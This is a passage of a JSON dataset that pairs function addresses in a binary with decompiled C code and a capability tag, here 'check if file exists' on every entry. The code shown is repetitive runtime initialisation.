(*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952c0 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 457
    },
    "00428a81": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428a81(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495290;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a74b(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495290 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00428b27": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428b27(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x49528c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a7e4(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x49528c = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00428bcd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428bcd(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952a4;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a87e(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952a4 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00428c73": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428c73(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495270;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a8fb(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495270 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00428d19": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428d19(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952a8;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a978(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952a8 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00428dbf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428dbf(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495274;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a9f5(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495274 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 454
    },
    "00428e65": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428e65(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952ac;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042aa72(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952ac = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 454
    },
    "00428f0b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428f0b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495278;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042ab02(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495278 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00428fb1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428fb1(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952c8;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042ab92(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952c8 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00429057": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00429057(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495294;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042ac13(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495294 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 451
    },
    "004290fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004290fd(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952cc;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042ac94(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952cc = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "004291a3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004291a3(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495298;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042ad0f(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495298 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "004357a3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004357a3(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952f4;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00435df9(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952f4 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00435849": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00435849(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952f8;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00435e9b(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952f8 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "004358ef": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004358ef(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952fc;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00435f18(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952fc = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00435995": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00435995(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495300;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00435f95(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495300 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 451
    },
    "00435a3b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00435a3b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495308;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00436012(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495308 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 452
    },
    "00435ae1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00435ae1(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495304;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.004360ab(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495304 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 451
    },
    "00435b87": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00435b87(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x49530c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00436145(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x49530c = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    